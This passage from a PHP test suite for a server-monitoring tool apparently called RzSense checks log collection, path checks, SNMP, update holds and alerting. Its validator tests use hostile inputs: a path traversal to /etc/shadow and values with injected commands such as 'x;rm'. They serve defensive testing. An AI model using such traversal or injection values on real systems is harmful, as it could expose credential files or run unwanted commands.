$bzSsvc = CveBuzz::ssvc(['containers' => ['adp' => [['metrics' => [['other' => ['type' => 'ssvc', 'content' => ['options' => [['Exploitation' => 'poc'], ['Automatable' => 'no'], ['Technical Impact' => 'total']]]]]]]]]]);
$bzInfo = CveBuzz::info('CVE-2099-7001');
ok($bz['score'] === 100 && $bz['exploit'] === 60 && $bz['talk'] >= 30 && $bzQuiet === [0, 0, 0] && $bzSsvc === ['e' => 'poc', 'a' => 'no', 't' => 'total']
    && CveBuzz::bucket('3094') === '3xxx' && CveBuzz::bucket('12345') === '12xxx' && CveBuzz::bucket('123') === '0xxx'
    && CveBuzz::verdict("OORDEEL: **eerst doen**\n### Waarom") === 'now' && CveBuzz::verdict('VERDICT: can wait') === 'later' && CveBuzz::verdict('geen oordeel') === ''
    && CveBuzz::safeUrl('https://infosec.exchange') && !CveBuzz::safeUrl('http://infosec.exchange') && !CveBuzz::safeUrl('https://10.0.0.1') && !CveBuzz::safeUrl('https://a.b:8443')
    && CveBuzz::trend([[date('Y-m-d', time() - 9 * 86400), 40], [date('Y-m-d'), 70]], 70) === 30 && $bzInfo['score'] === 100 && $bzInfo['id'] > 0
    && CveBuzz::info('geen-cve') === null && str_contains(CveBuzz::why($bz['data']), 'actief misbruikt'),
    'rugbaarheid: alles = 100 (exploits 60), stil = 0, SSVC en map voor CISA, AI-oordeel, Mastodon alleen via https naar een naam, stijging in 7 dagen');
q("DELETE FROM vuln_buzz WHERE cve = 'CVE-2099-7001'");
q("DELETE FROM vuln_cve WHERE cve = 'CVE-2099-7001'");
// 1.178.0: algemene SNMP-instelling (een server volgt hem of heeft eigen instellingen) en 🧪 Test (RzSense-deel + zelftest van de agent)
save_setting(SnmpMonitor::GLOBAL_KEY, '');
$sgNo = SnmpMonitor::clean(['on' => 1, 'use' => 'global'], null);
save_setting(SnmpMonitor::GLOBAL_KEY, json_encode(['v' => '3', 'port' => 161, 'user' => 'rzmon', 'level' => 'authPriv', 'auth_proto' => 'SHA256', 'auth_pass' => 'geheimgeheim', 'priv_proto' => 'AES', 'priv_pass' => 'geheimgeheim2']));
$sgYes = SnmpMonitor::clean(['on' => 1, 'use' => 'global'], null);
$sgCfg = SnmpMonitor::config(SnmpMonitor::USE_GLOBAL);
$sgMask = SnmpMonitor::masked(SnmpMonitor::USE_GLOBAL);
$sgOwn = SnmpMonitor::config(json_encode(['v' => '2c', 'port' => 161, 'community' => 'thuis']));
q("INSERT INTO hosts (name, address, mode, agent_seen, agent_version, agent_tick) VALUES ('ci-zelftest', '192.0.2.71', 'agent', NOW(), '1.79.0', 30)");
$atH = (int) db()->lastInsertId();
$atId = AgentTest::start($atH);
$atLines = AgentTest::agentLines($atH);
$atWait = AgentTest::result($atH, $atId);
AgentTest::fromAgent(['id' => $atH], ['selftest' => ['id' => $atId, 'now' => time() - 200, 'items' => [['k' => 'url', 'ok' => 'ok', 'd' => 'bereikbaar'], ['k' => 'BAD key', 'ok' => 'ok', 'd' => 'x'], ['k' => 'disk', 'ok' => 'raar', 'd' => 'y']]]]);
$atDone = AgentTest::result($atH, $atId);
$atSkew = array_values(array_filter($atDone['agent'] ?? [], fn($i) => $i['k'] === 'skew'))[0] ?? null;
ok(is_string($sgNo) && $sgYes === ['use' => 'global'] && ($sgCfg['user'] ?? '') === 'rzmon' && ($sgMask['use'] ?? '') === 'global' && ($sgMask['auth_pass'] ?? '') === '••••••••'
    && ($sgOwn['community'] ?? '') === 'thuis'
    && $atLines === ["0\tselftest\t$atId"] && $atWait['pending'] === true && $atWait['agent'] === null && $atWait['can'] === true
    && count($atDone['agent']) === 3 && $atDone['agent'][1]['ok'] === 'skip' && ($atSkew['ok'] ?? '') === 'bad' && AgentTest::agentLines($atH) === []
    && in_array('contact', array_column($atDone['server'], 'k'), true),
    'SNMP: zonder algemene instelling geweigerd, daarna volgt de server hem (gemaskeerd naar de browser); 🧪 Test: regel voor de agent, wachten, antwoord met klokverschil, vreemde sleutels eruit');
q('DELETE FROM hosts WHERE id = ?', [$atH]);
save_setting(SnmpMonitor::GLOBAL_KEY, '');
// 1.177.0: pad-check: regels voor de agent, metingen opslaan, beoordelen (doel, tussenliggend apparaat, linksnelheid via UniFi, doorvoer)
q("INSERT INTO hosts (name, address, mode, agent_seen, agent_version) VALUES ('ci-pad-doel', '192.0.2.61', 'agent', NOW(), '1.78.0')");
$pdH = (int) db()->lastInsertId();
$tnSt->execute([$pdH, 'caps', json_encode(['iperf3', 'mtr']), now()]);
q("INSERT INTO checks (host_id, type, target, name, interval_sec, warn_threshold, crit_threshold, options) VALUES (?, 'path', '1.1.1.1', 'pad', 300, 50, 150, ?)",
    [$tnH, json_encode(['via' => ['192.0.2.5'], 'tp' => 1, 'tp_every' => 3600, 'tp_min' => 200])]);
$pcId = (int) db()->lastInsertId();
$pcLines = Paths::agentLines($tnH);
$pdLines = Paths::agentLines($pdH);
$pcReq = json_decode((string) q("SELECT value FROM agent_data WHERE host_id = ? AND metric = ?", [$tnH, 'pathreq:' . $pcId])->fetchColumn(), true);
save_setting('path_unifi_cache', json_encode(['at' => time() + 3600, 'd' => ['error' => null,
    'switches' => ['aa:00:00:00:00:01' => ['mac' => 'aa:00:00:00:00:01', 'name' => 'USW', 'ip' => '192.0.2.10', 'model' => '', 'type' => 'usw',
        'ports' => [5 => ['idx' => 5, 'name' => 'Port 5', 'up' => true, 'speed' => 1000, 'full' => true, 'uplink' => false, 'rx_err' => 0, 'tx_err' => 0],
            8 => ['idx' => 8, 'name' => 'Port 8', 'up' => true, 'speed' => 100, 'full' => true, 'uplink' => true, 'rx_err' => 3, 'tx_err' => 0]],
        'uplink' => ['mac' => null, 'port' => 0, 'local' => 8, 'speed' => 100, 'type' => 'wire']]],
    'clients' => ['192.0.2.60' => ['mac' => null, 'sw' => 'aa:00:00:00:00:01', 'port' => 5, 'name' => 'ci']]]]));
$tnSt->execute([$tnH, 'pathmax:' . $pcId, json_encode(['nic' => 1000, 'port' => 1000, 'uplink' => 1000]), now()]);
$pcHost = q('SELECT * FROM hosts WHERE id = ?', [$tnH])->fetch();
$pcRun = static function (array $via, array $ping, ?array $tp = null) use ($pcHost, $pcId) {
    Paths::fromAgent($pcHost, ['path' => [$pcId => ['at' => time(), 'tool' => 'mtr', 'dst' => '1.1.1.1', 'dev' => 'eth0', 'src' => '192.0.2.60', 'gw' => '192.0.2.1', 'speed' => 1000, 'virt' => '',
        'hops' => [['n' => 1, 'ip' => '192.0.2.1', 'loss' => 0, 'avg' => 1.2], ['n' => 2, 'ip' => '203.0.113.9', 'loss' => 60, 'avg' => 9.1], ['n' => 3, 'ip' => '1.1.1.1', 'loss' => 0, 'avg' => 12.0]],
        'via' => [$via], 'ping' => $ping] + ($tp ? ['tp' => $tp] : [])]]);
    return Paths::check(q('SELECT * FROM checks WHERE id = ?', [$pcId])->fetch(), $pcHost);
};
$pr1 = $pcRun(['ip' => '192.0.2.5', 'loss' => 0, 'avg' => 0.5], ['ip' => '1.1.1.1', 'loss' => 0, 'avg' => 12.0], ['to' => '192.0.2.61', 'mbit' => 94.0, 'key' => $pcReq['key'] ?? '']);
$pr2 = $pcRun(['ip' => '192.0.2.5', 'loss' => 100, 'avg' => null], ['ip' => '1.1.1.1', 'loss' => 0, 'avg' => 12.0]);
$pr3 = $pcRun(['ip' => '192.0.2.5', 'loss' => 0, 'avg' => 0.5], ['ip' => '1.1.1.1', 'loss' => 100, 'avg' => null]);
ok(in_array("$pcId\tpath\t1.1.1.1\t192.0.2.5\t300", $pcLines, true) && ($pcReq['host'] ?? 0) === $pdH && (bool) preg_grep('/^0\tiperfs\t5201\t\d+$/', $pdLines)
    && $pr1['status'] === STATUS_WARN && str_contains($pr1['message'], 'uplink') && str_contains($pr1['message'], '94') && $pr1['value'] === 12.0
    && !str_contains($pr1['message'], '203.0.113.9') && $pr2['status'] === STATUS_CRIT && $pr3['status'] === STATUS_CRIT && str_contains($pr3['message'], 'onbereikbaar')
    && str_starts_with((string) json_decode((string) $pr1['path_sum'], true)['d'], 'g'),
    'pad-check: opdracht voor de agent, doorvoertest naar een server met iperf3, uplink op 100 Mbit en lage doorvoer = WARNING, verlies bij een tussenhop van de provider telt niet, switch of doel weg = CRITICAL');
// 1.189.2: een volgend rapport zonder nieuwe meting ruimt de meting niet op (anders bleef de check op onbekend)
$tnSt->execute([$tnH, 'ci_oud', '1', date('Y-m-d H:i:s', time() - 120)]);
q("UPDATE agent_data SET updated_at = NOW() - INTERVAL 2 MINUTE WHERE host_id = ? AND metric LIKE 'path%'", [$tnH]);
$tnSt->execute([$tnH, 'path:999999', '{}', date('Y-m-d H:i:s', time() - 120)]);
Paths::cleanAgentData($tnH, now());
$pr4 = Paths::check(q('SELECT * FROM checks WHERE id = ?', [$pcId])->fetch(), $pcHost);
$left = q('SELECT metric FROM agent_data WHERE host_id = ?', [$tnH])->fetchAll(PDO::FETCH_COLUMN);
ok($pr4['status'] === STATUS_CRIT && in_array('path:' . $pcId, $left, true) && in_array('pathmax:' . $pcId, $left, true) && !in_array('ci_oud', $left, true) && !in_array('path:999999', $left, true),
    'pad-check na een rapport zonder nieuwe meting: de meting blijft (niet onbekend), oude regels en die van verwijderde checks gaan weg');
// 1.191.1: een nieuwe meting wordt meteen beoordeld (niet pas na het interval), maar niet twee keer in hetzelfde rapport
q('UPDATE checks SET status = 3, last_checked = NOW() - INTERVAL 1 MINUTE WHERE id = ?', [$pcId]);
$pfSince = now();
$pcRun(['ip' => '192.0.2.5', 'loss' => 0, 'avg' => 0.5], ['ip' => '1.1.1.1', 'loss' => 0, 'avg' => 12.0]);
Paths::runFresh($pfSince);
$pf1 = q('SELECT status, (SELECT COUNT(*) FROM results WHERE check_id = c.id) AS n FROM checks c WHERE id = ?', [$pcId])->fetch();
$pcRun(['ip' => '192.0.2.5', 'loss' => 0, 'avg' => 0.5], ['ip' => '1.1.1.1', 'loss' => 0, 'avg' => 12.0]);
Paths::runFresh($pfSince);
$pf2 = (int) q('SELECT COUNT(*) FROM results WHERE check_id = ?', [$pcId])->fetchColumn();
ok((int) $pf1['status'] !== 3 && $pf2 === (int) $pf1['n'], 'pad-check: een nieuwe meting wordt meteen beoordeeld (niet meer onbekend), maar niet twee keer in hetzelfde rapport');
// 1.192.0: doorvoertest aan en geen iperf3: de agent installeert het (één opdracht, niet opnieuw); zonder commando's als root niet
q("INSERT INTO hosts (name, address, mode, agent_seen, agent_version, commands) VALUES ('ci-ip-zender', '192.0.2.81', 'agent', NOW(), '1.80.0', 'root')");
$ipA = (int) db()->lastInsertId();
q("INSERT INTO hosts (name, address, mode, agent_seen, agent_version, commands) VALUES ('ci-ip-noroot', '192.0.2.82', 'agent', NOW(), '1.80.0', 'off')");
$ipB = (int) db()->lastInsertId();
foreach ([$ipA, $ipB] as $ipH) {
    $tnSt->execute([$ipH, 'caps', json_encode(['mtr']), now()]);
    q("INSERT INTO checks (host_id, type, target, name, interval_sec, options) VALUES (?, 'path', '1.1.1.1', 'pad', 300, ?)", [$ipH, json_encode(['tp' => 1, 'tp_every' => 3600])]);
}
Paths::agentLines($ipA);
$ipReq1 = json_decode((string) q('SELECT vuln_upgrade_req FROM hosts WHERE id = ?', [$ipA])->fetchColumn(), true);
Paths::agentLines($ipA);
$ipReq2 = json_decode((string) q('SELECT vuln_upgrade_req FROM hosts WHERE id = ?', [$ipA])->fetchColumn(), true);
Paths::agentLines($ipB);
$ipReqB = q('SELECT vuln_upgrade_req FROM hosts WHERE id = ?', [$ipB])->fetchColumn();
Paths::cleanAgentData($ipA, now());   // de markering overleeft het opruimen na een rapport
$ipMark = q("SELECT 1 FROM agent_data WHERE host_id = ? AND metric = 'iperf_inst'", [$ipA])->fetchColumn();
q('DELETE FROM hosts WHERE id IN (?, ?)', [$ipA, $ipB]);
ok(($ipReq1['pkgs'] ?? null) === ['iperf3'] && ($ipReq1['mode'] ?? '') === 'install' && ($ipReq2['id'] ?? '') === ($ipReq1['id'] ?? 'x') && !$ipReqB && $ipMark,
    'iperf3: doorvoertest aan en het ontbreekt = de agent installeert het (één opdracht, niet opnieuw), zonder commando\'s als root niet');
q('DELETE FROM hosts WHERE id = ?', [$pdH]);
save_setting('path_unifi_cache', '');
// 1.175.0: TrueNAS 27 geeft via midclt geen temperaturen: dan uit de SMART-gegevens van de agent
Truenas::fromAgent(['id' => $tnH], ['version' => 'TrueNAS-27.0.0', 'at' => time(), 'temps' => []], $tnSt, now());
$tnSt->execute([$tnH, 'smart', json_encode([['dev' => '/dev/sda', 'temp' => 38], ['dev' => '/dev/nvme0', 'temp' => 57], ['dev' => '/dev/sdc', 'standby' => true], ['dev' => '/dev/x;y', 'temp' => 99]]), now()]);
[$smS, $smV, $smM] = $tc('temp', '', 50, 60);
$smD = Truenas::data($tnH);
ok($smS === STATUS_WARN && $smV === 57.0 && !str_contains((string) $smM, 'midclt') && ($smD['temps_from'] ?? '') === 'smart' && array_keys($smD['temps']) === ['nvme0', 'sda'],
    'TrueNAS: geen temperaturen via midclt, dan die uit SMART (slapende schijf en vreemde namen overgeslagen)');
q('DELETE FROM hosts WHERE id = ?', [$tnH]);

// 1.205.0: agents wachten tijdens een update van RzSense (aankondigen, vrijgave, samenvatting, geen "agent stil")
section('Update: agents wachten op de vrijgave');
q("INSERT INTO hosts (name, address, mode, enc_seen, agent_version, agent_seen) VALUES ('ci-uh1', '10.0.9.1', 'agent', 1, '1.82.0', NOW()), ('ci-uh2', '10.0.9.2', 'agent', 1, '1.82.0', NOW()), ('ci-uh3', '10.0.9.3', 'agent', 1, '1.81.0', NOW())");
$uh1 = (int) q("SELECT id FROM hosts WHERE name = 'ci-uh1'")->fetchColumn();
$uh2 = (int) q("SELECT id FROM hosts WHERE name = 'ci-uh2'")->fetchColumn();
$uhOld = (int) q("SELECT id FROM hosts WHERE name = 'ci-uh3'")->fetchColumn();
save_setting('update_hold_min', '5');
UpdateHold::announce(['backup' => true, 'by' => 'ci', 'at' => time()], '1.204.0', '1.205.0');
$uhH = UpdateHold::get();
$uhA = UpdateHold::forAgent(['id' => $uh1], true, []);
$uhPlain = UpdateHold::forAgent(['id' => $uh2], false, []);
$uhSt = Updater::status();
ok($uhH && in_array($uh1, $uhH['need'], true) && !in_array($uhOld, $uhH['need'], true) && empty($uhH['started'])
    && ($uhA['rz_hold']['id'] ?? '') === $uhH['id'] && ($uhA['rz_hold']['max'] ?? 0) > 280 && ($uhA['rz_hold']['max'] ?? 0) <= 300
    && $uhPlain === [] && ($uhSt['state'] ?? '') === 'queued' && ($uhSt['agents'] ?? []) === [1, 2],
    'update aangekondigd: alleen versleuteld en vanaf agent 1.82.0 (5 min); start pas als iedereen het weet (1 van 2)');
q("UPDATE hosts SET agent_seen = NOW() - INTERVAL 7 MINUTE WHERE id = ?", [$uh2]);
q("UPDATE hosts SET agent_seen = NOW() - INTERVAL 30 MINUTE WHERE id = ?", [$uhOld]);   // was al stil vóór de update
$uhCov = Checks::agentStale(q('SELECT * FROM hosts WHERE id = ?', [$uh2])->fetch()) === null
    && Checks::agentStale(q('SELECT * FROM hosts WHERE id = ?', [$uhOld])->fetch()) !== null;
// Gestart (zonder hulpdienst in de test), dan de nieuwe versie: klaar, de agent meldt zijn wachttijd
$uhH['started'] = time() - 50;
save_setting('update_hold', (string) json_encode($uhH));
$uhFin = UpdateHold::finished('1.204.0');
$uhAfter = UpdateHold::forAgent(['id' => $uh1], true, ['hold' => ['id' => $uhH['id'], 'since' => time() - 40, 'q' => 3]]);
$uhMsg = (string) UpdateHold::cron();
ok($uhCov && $uhFin && $uhAfter === [] && str_contains($uhMsg, '1.205.0') && str_contains($uhMsg, '3 metingen') && str_contains($uhMsg, 'ci-uh1')
    && UpdateHold::get() === null && !q("SELECT COUNT(*) FROM settings WHERE name LIKE 'update_hold_ack:%'")->fetchColumn(),
    'na de update: vrijgave (geen rz_hold), samenvatting met nagestuurde metingen, opgeruimd; tijdens de update geen "agent stil" (wel als hij al eerder stil was)');
q('DELETE FROM hosts WHERE id IN (?, ?, ?)', [$uh1, $uh2, $uhOld]);

// 1.206.0: bevestigen met een vinkje per rol, zolang het wachtwoord de laatste N minuten is ingevuld
section('Bevestigen bij acties');
$cfSess = $_SESSION ?? [];
$_SESSION = [];
save_setting('confirm_skip_admin', '1');
save_setting('confirm_skip_user', '0');
save_setting('confirm_grace_min', '60');
$cfAdmin = ['id' => 1, 'role' => 'admin'];
$cfUser = ['id' => 2, 'role' => 'user'];
$cfNoPw = Confirm::canSkip($cfAdmin, 'ISOLEREN');   // nog nooit wachtwoord ingevuld in deze sessie
Confirm::passwordEntered();
$cfOk = Confirm::canSkip($cfAdmin, 'ISOLEREN') && !Confirm::canSkip($cfAdmin, 'PASSKEY') && !Confirm::canSkip($cfAdmin, 'DOWNLOADEN') && !Confirm::canSkip($cfUser, 'ISOLEREN');
$_SESSION['pw_at'] = time() - 61 * 60;
$cfOld = Confirm::canSkip($cfAdmin, 'ISOLEREN');
save_setting('confirm_grace_min', '90');
$cfLonger = Confirm::canSkip($cfAdmin, 'ISOLEREN');
save_setting('confirm_skip_user', '1');
$_SESSION = ['lan_auto' => true];
$cfLan = Confirm::canSkip($cfUser, 'BLOKKEREN') && str_contains(Confirm::refusal($cfUser, 'BLOKKEREN'), 'BLOKKEREN');
$cfSt = Confirm::state($cfAdmin);
$_SESSION = $cfSess;
save_setting('confirm_skip_user', '0');
save_setting('confirm_grace_min', '60');
ok(!$cfNoPw && $cfOk && !$cfOld && $cfLonger && $cfLan && $cfSt['skip'] === true && in_array('UITLOGGEN', $cfSt['always'], true),
    'vinkje: beheerder ja (gebruiker uit), niet bij account-zaken, alleen binnen de ingestelde minuten na het wachtwoord, op het lokale netwerk altijd');

section('Logs verzamelen (1.210.0)');
$lsA = LogStore::save($ha, ['kind' => 'file', 'spec' => '/var/log/nginx/*.log', 'name' => 'nginx', 'level' => 2]);
$lsJ = LogStore::save($ha, ['kind' => 'journal', 'spec' => '']);
ok(is_int($lsA) && is_int($lsJ) && is_string(LogStore::save($ha, ['kind' => 'file', 'spec' => '/var/log/../etc/shadow']))
    && is_string(LogStore::save($ha, ['kind' => 'docker', 'spec' => 'x;rm']))
    && is_string(LogStore::save($ha, ['kind' => 'ha', 'spec' => 'addon:../x'])), 'bronnen: geldige paden en namen, geen .. of vreemde tekens');
$lsLines = LogStore::agentLines($ha);
ok(in_array("$lsA\tlogsrc\tfile\t/var/log/nginx/*.log\t2", $lsLines, true) && in_array("0\tlogship\t300", $lsLines, true), 'de agent krijgt de bronnen en elke 5 minuten');
$lsNow = time();
$lsRaw = "rzlogs1\tci-batch-1\t$lsNow\t0\t+0000\n"
    . "L\t$lsA\t$lsNow\t" . gmdate('Y-m-d H:i:s', $lsNow - 60) . " ERROR login mislukt voor jan@example.com password=hunter2 token=abcdef123456\n"
    . "L\t$lsJ\t$lsNow\t" . date('M j H:i:s', $lsNow) . " web sshd[1]: Accepted publickey for root\n"
    . "S\t$lsA\terr\t0\tbuiten LOG_DIRS\n";
$lsR1 = LogStore::ingest(['id' => $ha, 'name' => 'ci-a'], $lsRaw);
$lsR2 = LogStore::ingest(['id' => $ha, 'name' => 'ci-a'], $lsRaw);
$lsLast = LogStore::lastLines($lsA, 1)[0] ?? [];
ok($lsR1['stored'] === 2 && !empty($lsR2['dup']) && ($lsLast['level'] ?? 0) === 3 && str_contains($lsLast['msg'] ?? '', '••••@••••')
    && !str_contains($lsLast['msg'] ?? '', 'hunter2') && !str_contains($lsLast['msg'] ?? '', 'abcdef123456'),
    'pakketje: opgeslagen, dubbel niet nog eens, niveau herkend, wachtwoord, token en e-mail gemaskeerd');
ok(abs(strtotime($lsLast['ts'] ?? '') - ($lsNow - 60)) < 2 && (array_column(LogStore::sources($ha), 'status', 'name')['nginx'] ?? '') === 'err', 'tijd uit de regel (met de tijdzone van de server), status van de bron');
ok(LogStore::stamp('[07/Nov/2026:11:02:14 +0100] GET /', strtotime('2026-11-07 10:05:00 UTC')) === strtotime('2026-11-07 10:02:14 UTC')
    && LogStore::stamp('zomaar tekst', 123456789) === 123456789 && LogStore::level('WARNING: bijna vol') === 2 && LogStore::level('debug: x') === 0,
    'tijd en niveau: nginx-formaat, zonder tijd de tijd van lezen, warning en debug');
save_setting('logs_day_mb', '1');
$lsBig = "rzlogs1\tci-batch-2\t$lsNow\t0\t+0000\n" . str_repeat("L\t$lsA\t$lsNow\t" . str_repeat('x', 1000) . "\n", 1200);
$lsR3 = LogStore::ingest(['id' => $ha, 'name' => 'ci-a'], $lsBig);
ok($lsR3['dropped'] > 0 && $lsR3['stored'] < 1200 && in_array("0\tlogpause\t" . strtotime('tomorrow'), LogStore::agentLines($ha), true), 'daglimiet: de rest weggegooid en de agent pauzeert tot middernacht');
save_setting('logs_day_mb', '200');
$lsOld = LogStore::table(date('Y-m-d', strtotime('-30 days')));
LogStore::purge();
ok(!in_array($lsOld, array_column(LogStore::dayTables(), 'name'), true) && in_array(LogStore::table(date('Y-m-d')), array_column(LogStore::dayTables(), 'name'), true),
    'opruimen: een dag ouder dan de bewaartermijn gaat weg, vandaag blijft');
$lsOv = LogStore::overview();
ok($lsOv['raw'] > 0 && $lsOv['used'] > 0 && $lsOv['rows'] >= 2, 'overzicht: opslag en aantallen');

section('Logs zoeken (1.211.0)');
$lsQ = LogStore::parseQuery('"Failed password" -deploy server:ci-a bron:nginx niveau:error /port \d+/');
ok($lsQ['words'] === ['failed password'] && $lsQ['not'] === ['deploy'] && $lsQ['hosts'] === ['ci-a'] && $lsQ['sources'] === ['nginx'] && $lsQ['level'] === 3 && $lsQ['re'] !== null,
    'zoekopdracht: zin, uitsluiten, server:, bron:, niveau: en regex');
ok(isset(LogStore::search(['q' => '/[kapot/'])['error']), 'een ongeldige regex geeft een foutmelding');
$lsNow2 = time();
$lsRaw2 = "rzlogs1\tci-zoek\t$lsNow2\t0\t+0000\n";
foreach (range(1, 30) as $i) {
    $lsRaw2 .= "L\t$lsA\t$lsNow2\t" . gmdate('Y-m-d H:i:s', $lsNow2 - 600 + $i * 10) . ($i % 3 ? " INFO gewone regel $i" : " ERROR Failed password for root regel $i") . "\n";
}
LogStore::ingest(['id' => $ha, 'name' => 'ci-a'], $lsRaw2);
$lsS = LogStore::search(['q' => '"failed password" regel', 'from' => $lsNow2 - 3600, 'to' => $lsNow2 + 60, 'limit' => 3]);
$lsS2 = LogStore::search(['q' => 'regel -failed', 'from' => $lsNow2 - 3600, 'to' => $lsNow2 + 60, 'level' => 1]);
ok($lsS['total'] === 10 && count($lsS['hits']) === 3 && str_contains($lsS['hits'][0]['msg'], 'regel 30') && $lsS['hits'][0]['ts'] > $lsS['hits'][1]['ts']
    && $lsS['levels'][3] === 10 && array_sum(array_merge(...$lsS['hist'])) === 10, 'zoeken: alle treffers geteld, de nieuwste eerst, per niveau en per tijdvak');
ok($lsS2['total'] === 20, 'uitsluiten en het niveaufilter (info)');
$lsC = LogStore::context($lsS['hits'][1]['ref']);
ok($lsC !== null && count($lsC['before']) === 3 && count($lsC['after']) === 3 && str_contains($lsC['after'][0]['msg'], 'regel 28'), 'regels eromheen: 3 ervoor en de regels erna');
ok(LogStore::search(['q' => 'regel server:bestaatniet', 'from' => $lsNow2 - 3600])['total'] === 0, 'server: die niet bestaat geeft niets');

section('Vaste zoekacties op de logs (1.212.0)');
ok(is_string(LogWatch::clean(['name' => 'x', 'q' => 'server:ci-a'])) && is_string(LogWatch::clean(['name' => '', 'q' => 'fout'])) && is_string(LogWatch::clean(['name' => 'x', 'q' => '/[kapot/'])),
    'zoekactie zonder iets om op te zoeken, zonder naam of met een kapotte regex wordt geweigerd');
$lwIn = ['name' => 'ci-ssh', 'q' => '"failed password" server:ci-a', 'mode' => 'many', 'threshold' => 5, 'win' => 5, 'per_host' => 1, 'severity' => STATUS_CRIT, 'rest' => 30, 'recover' => 1];
$lwSim = LogWatch::simulate($lwIn);
ok(!isset($lwSim['error']) && $lwSim['count'] >= 1 && count($lwSim['hist']) > 200, 'proef op 24 uur: de 10 mislukte logins van zojuist hadden een melding gegeven');
$lwId = LogWatch::save(null, $lwIn, 'ci');
$lwNone = LogWatch::save(null, ['name' => 'ci-backup', 'q' => '"backup completed" server:ci-a', 'mode' => 'none', 'win' => 60, 'severity' => STATUS_WARN], 'ci');
ok(is_int($lwId) && is_int($lwNone), 'zoekacties bewaard');
$lwFeed = function (int $n, string $batch, string $text = 'ERROR Failed password for root from 203.0.113.9') use ($ha, $lsA) {
    $t = time();
    $raw = "rzlogs1\t$batch\t$t\t0\t+0000\n";
    for ($i = 0; $i < $n; $i++) {
        $raw .= "L\t$lsA\t$t\t" . gmdate('Y-m-d H:i:s', $t - $i) . " $text port $i\n";
    }
    LogStore::ingest(['id' => $ha, 'name' => 'ci-a'], $raw);
};
$lwAlerts = fn() => q('SELECT * FROM alerts WHERE log_watch LIKE ? ORDER BY id', [$lwId . ':%'])->fetchAll();
$lwFeed(3, 'ci-lw1');
ok(count($lwAlerts()) === 0, 'onder de drempel (3 van 5): geen melding');
$lwFeed(4, 'ci-lw2');
$lwA = $lwAlerts();
ok(count($lwA) === 1 && (int) $lwA[0]['status'] === STATUS_CRIT && $lwA[0]['kind'] === 'logs' && $lwA[0]['log_watch'] === "$lwId:$ha"
    && str_contains($lwA[0]['title'], 'ci-a') && str_contains($lwA[0]['message'], '7') && $lwA[0]['ip'] === '203.0.113.9',
    'drempel gehaald over twee pakketjes heen: één critical-melding met het aantal en het IP dat het meest voorkomt');
$lwFeed(10, 'ci-lw3');
ok(count($lwAlerts()) === 1 && (int) q('SELECT peak FROM log_watch_state WHERE watch_id = ?', [$lwId])->fetchColumn() === 17, 'melding al open: geen nieuwe, wel het hoogste aantal bijgewerkt');
LogWatch::reset();
LogWatch::cron();
ok(count($lwAlerts()) === 1, 'nog binnen het venster: blijft open');
q('UPDATE log_watch_counts SET minute = minute - 10 WHERE watch_id = ?', [$lwId]);
q('UPDATE log_watch_state SET opened_at = opened_at - INTERVAL 10 MINUTE WHERE watch_id = ?', [$lwId]);
LogWatch::cron();
$lwA = $lwAlerts();
ok(count($lwA) === 2 && (int) $lwA[1]['status'] === STATUS_OK && str_contains($lwA[1]['title'], t('HERSTELD')) && !(int) q('SELECT open FROM log_watch_state WHERE watch_id = ?', [$lwId])->fetchColumn(),
    'een heel venster rustig: herstelmelding en dicht');
$lwFeed(8, 'ci-lw4');
ok(count($lwAlerts()) === 2, 'binnen de rustperiode: geen nieuwe melding');
// geen treffers: na het venster (zonder ooit een treffer) een warning; een treffer sluit hem
q('UPDATE log_watches SET created_at = NOW() - INTERVAL 2 HOUR WHERE id = ?', [$lwNone]);
q('UPDATE log_watch_state SET since = NOW() - INTERVAL 2 HOUR WHERE watch_id = ?', [$lwNone]);
LogWatch::reset();
LogWatch::cron();
$lwN = q('SELECT * FROM alerts WHERE log_watch LIKE ? ORDER BY id', [$lwNone . ':%'])->fetchAll();
ok(count($lwN) === 1 && (int) $lwN[0]['status'] === STATUS_WARN, 'geen treffers in het venster: een warning');
$lwFeed(1, 'ci-lw5', 'INFO backup completed ok');
$lwN = q('SELECT * FROM alerts WHERE log_watch LIKE ? ORDER BY id', [$lwNone . ':%'])->fetchAll();
ok(count($lwN) === 2 && (int) $lwN[1]['status'] === STATUS_OK, 'er is weer een treffer: hersteld');
$lwAll = LogWatch::all();
ok(count($lwAll) === 2 && array_sum(array_column($lwAll, 'hours')[array_search('ci-ssh', array_column($lwAll, 'name'), true)]) >= 17, 'overzicht: treffers per uur voor het grafiekje');
LogWatch::setEnabled($lwId, false);
$lwFeed(20, 'ci-lw6');
ok(count($lwAlerts()) === 2, 'uitgezet: telt niet meer en meldt niets');
LogWatch::delete($lwId);
LogWatch::delete($lwNone);
ok(!q('SELECT 1 FROM log_watch_state WHERE watch_id IN (?, ?)', [$lwId, $lwNone])->fetchColumn() && !q('SELECT 1 FROM log_watches')->fetchColumn(), 'verwijderd, met de stand en de tellingen');

section('Logs vinden op de server (1.213.0)');
q('UPDATE hosts SET logscan_req = 0 WHERE id = ?', [$ha]);
ok(!in_array("0\tlogscan\t0", LogStore::agentLines($ha), true), 'zonder verzoek geen regel logscan naar de agent');
q('UPDATE hosts SET logscan_req = 2 WHERE id = ?', [$ha]);
ok(in_array("0\tlogscan\t2", LogStore::agentLines($ha), true), 'Opnieuw zoeken: de agent krijgt de regel logscan met de teller');
$lfT = time();
$lfScan = ['at' => $lfT, 'req' => 1, 'dirs' => '/var/log', 'files' => [['/var/log/auth.log', 100, $lfT], ['/var/log/nginx/access.log', 200, $lfT], ['/var/log/nginx/error.log', 50, $lfT],
    ['/var/log/apt/history.log', 10, $lfT], ['/var/log/old.log', 5, $lfT - 90 * 86400], ['/var/log/../etc/shadow', 1, $lfT]],
    'docker' => [['vaultwarden', 'vaultwarden/server', 'running', 'docker'], ['bad name!', 'x', 'running', 'docker']], 'units' => [['ssh.service', 40], ['cron.service', 900]], 'ha' => [], 'noread' => ['/var/log/private']];
LogStore::storeScan($ha, $lfScan);
$lf = LogStore::found($ha);
$lfNames = array_column($lf['groups']['dirs'], 'name');
$lfNginx = $lf['groups']['dirs'][array_search('nginx', $lfNames, true)] ?? null;
ok($lfNginx && $lfNginx['folder'] && $lfNginx['spec'] === '/var/log/nginx/*.log' && count($lfNginx['files']) === 2 && $lfNginx['rec'], 'een map met meer bestanden wordt één bron (map/*.log), aanbevolen');
ok(in_array('history.log', $lfNames, true) && !in_array('shadow', $lfNames, true) && end($lf['groups']['dirs'])['name'] === 'old.log' && end($lf['groups']['dirs'])['quiet'],
    'één bestand in een submap los; paden met .. weggelaten; stil (90 dagen) onderaan');
